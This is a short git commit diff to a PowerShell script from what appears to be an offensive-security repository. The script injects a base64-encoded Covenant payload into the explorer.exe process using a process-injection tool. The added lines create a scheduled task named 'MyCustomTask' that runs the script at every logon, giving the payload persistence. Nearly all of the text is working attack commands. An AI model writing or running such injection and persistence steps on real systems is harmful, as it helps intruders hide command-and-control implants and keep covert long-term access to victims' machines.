85221a2540e4a4c2519f3864912f9e40e2b6d6a6
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-18 18:06:57 -0500

    Update InjectPayloadtoMemoryOnboot.ps1

--- Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
+++ Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
@@ -3,3 +3,6 @@ $procid=(get-process explorer).id | Select-Object -First 1
 
 # Inject Payload into Memory
 C:\Users\Administrator\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe /pid:$procid /path:C:\Users\Administrator\Downloads\covenant.txt /f:base64 /t:1
+
+# Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
+schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
